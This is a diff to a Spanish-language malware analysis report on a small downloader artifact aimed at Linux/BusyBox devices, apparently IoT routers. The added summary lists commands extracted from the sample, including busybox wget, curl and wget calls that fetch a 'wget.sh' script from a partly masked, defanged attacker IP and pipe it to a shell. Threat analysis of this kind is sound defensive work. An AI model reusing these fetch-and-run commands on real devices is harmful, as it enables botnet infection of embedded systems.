@@ -4,7 +4,13 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 397 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `GetStationInfo` en `hxxp://linksys[.]com/jnap/wpsstationinfo/GetStationInfo`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 397 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `GetStationInfo` en `hxxp://linksys[.]com/jnap/wpsstationinfo/GetStationInfo`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `sh -s lwps`
+2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
+3. `curl hxxp://91.92.40.XXX/wget.sh`
+4. `wget hxxp://91.92.40.XXX/wget.sh -O-`
+5. `busybox wget hxxp://91.92.40.XXX` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85.md](../../../../../malware-like/oraculo/downloader/5728d6f16d262a5cfe6ab7f09d971bc122f914d916f99556680c664839c7fd85.md)
 
 
 ## 🏷️ Clasificación
